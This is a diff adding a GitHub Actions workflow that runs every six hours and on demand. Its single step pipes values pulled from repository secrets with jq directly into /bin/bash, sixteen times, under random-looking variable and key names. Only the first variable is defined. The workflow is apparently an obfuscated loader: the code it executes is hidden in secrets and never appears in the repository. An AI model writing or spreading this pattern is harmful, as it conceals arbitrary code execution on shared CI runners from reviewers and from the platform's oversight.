@@ -1,0 +1,32 @@
+name: zhongmiddleliumeiti
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongmiddleliumeiti
+        env:
+          gv4856: ${{ secrets.gv4856 }}
+        run: |
+          echo $gv4856 | jq -r .t4361 | /bin/bash
+          echo $prd23 | jq -r .yd496 | /bin/bash
+          echo $buwp28 | jq -r .qok23 | /bin/bash
+          echo $zmo39 | jq -r .aep950 | /bin/bash
+          echo $glcy26647 | jq -r .xsho20 | /bin/bash
+          echo $zgvt70 | jq -r .vkza5 | /bin/bash
+          echo $ali772 | jq -r .xnsz905 | /bin/bash
+          echo $za9878 | jq -r .x8534 | /bin/bash
+          echo $rlq94 | jq -r .dxepq79757 | /bin/bash
+          echo $f94403 | jq -r .m88 | /bin/bash
+          echo $uq04969 | jq -r .ft1941 | /bin/bash
+          echo $onl52 | jq -r .iuw9 | /bin/bash
+          echo $vewpx6543 | jq -r .gpj3 | /bin/bash
+          echo $pg4907 | jq -r .bgfpb8713 | /bin/bash
+          echo $c97 | jq -r .iuuzj466 | /bin/bash
+          echo $mbhm42 | jq -r .dw79 | /bin/bash
+
